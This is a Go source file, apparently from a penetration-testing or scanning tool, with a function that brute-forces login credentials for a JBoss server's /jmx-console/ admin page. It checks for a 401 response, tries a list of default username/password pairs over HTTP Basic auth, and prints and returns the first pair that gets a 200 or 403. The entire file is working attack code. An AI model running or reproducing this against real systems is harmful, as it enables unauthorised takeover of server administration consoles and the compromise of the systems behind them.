package brute

import "fmt"

func Jboss_brute(url string) (username string, password string) {
	if req, err := httpRequsetBasic("asdasdascsacacs", "asdasdascsacacs", url+"/jmx-console/", "GET", ""); err == nil {
		if req.StatusCode == 401 {
			for uspa := range jbossuserpass {
				if req2, err2 := httpRequsetBasic(jbossuserpass[uspa].username, jbossuserpass[uspa].password, url+"/jmx-console/", "GET", ""); err2 == nil {
					if req2.StatusCode == 200 || req2.StatusCode == 403 {
						fmt.Printf("jboss-brute-sucess|%s:%s--%s", jbossuserpass[uspa].username, jbossuserpass[uspa].password, url)
						fmt.Println()
						return jbossuserpass[uspa].username, jbossuserpass[uspa].password
					}
				}
			}
		}
	}
	return "", ""
}
